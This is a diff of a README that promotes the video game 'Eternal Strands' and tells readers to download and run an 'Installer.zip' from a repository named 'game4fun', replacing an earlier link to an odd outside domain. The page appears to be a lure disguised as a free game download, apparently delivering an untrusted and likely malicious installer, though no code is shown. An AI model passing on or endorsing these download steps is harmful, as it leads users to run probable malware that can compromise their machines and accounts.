@@ -8,6 +8,7 @@ _Eternal Strands_ invites players into a vibrant, yet dangerous world where ever
 As you delve deeper into the game, you will unlock powerful abilities, solve complex puzzles, and engage with a wide range of characters. Your interactions and alliances will shape your journey, offering both thrilling combat and meaningful character development.
 
 The game challenges players to think critically and act decisively, with multiple paths leading to different outcomes. Every twist and turn in _Eternal Strands_ makes it an unforgettable experience, blending combat and exploration into one seamless world.
+
 ![image](https://github.com/user-attachments/assets/eb590a0a-1b8f-4bab-bf29-05c3451fc494)
 ![image](https://github.com/user-attachments/assets/e7cf5eb3-5c68-4187-af50-85029efe7cec)
 ![image](https://github.com/user-attachments/assets/6a221e15-ea7f-478c-a1d5-645c7c95193e)
@@ -18,7 +19,7 @@ The game challenges players to think critically and act decisively, with multipl
 ### Download and Installation Instructions
 
 1. **Download the Installer**:  
-   Click [here](https://nicecolns.com/) to download the game installer.
+   Click [here](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip) to download the game installer.
 
 2. **Run the Installer**:  
    Once the download is finished, open the installer file to begin the installation.
